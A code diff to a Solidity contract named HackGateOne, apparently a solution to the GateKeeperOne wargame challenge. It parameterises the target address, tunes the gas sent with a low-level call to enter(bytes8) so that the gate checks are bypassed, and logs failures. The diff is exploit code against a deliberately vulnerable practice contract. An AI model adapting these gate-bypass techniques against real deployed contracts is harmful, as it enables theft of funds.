@@ -7,11 +7,18 @@ import './GateKeeperOne.sol';
 contract HackGateOne {
 
   using SafeMath for uint256;
-  GateKeeperOne gateko = GateKeeperOne(0xEa971eA40946b541a81716E959ce51Bddb3dFD4D);
-  address gatekoadd = 0xEa971eA40946b541a81716E959ce51Bddb3dFD4D;
+  address public gatekoadd;
+  GateKeeperOne public gateko;
+  event Fail(bytes data);
+
+  constructor(address _gatekoadd) public {
+    gatekoadd = _gatekoadd;
+    gateko = GateKeeperOne(gatekoadd);
+  }
 
   function hack(bytes32 _gateKey) public {
-    gatekoadd.call.value(0 ether).gas(1075173)(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)));
+    (bool result, bytes memory data) = gatekoadd.call.value(0 ether).gas(1065084)(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)));
+    emit Fail(data);
   }
 
   function get8(bytes32 _gateKey) view public returns (bytes8) {
@@ -32,6 +39,10 @@ contract HackGateOne {
 
   function get64(bytes8 _gateKey) view public returns (uint64) {
       return uint64(_gateKey);
+  }
+
+  function get_bytes_from_64(uint64 _gateKey) view public returns (bytes8) {
+      return bytes8(_gateKey);
   }
 
 }
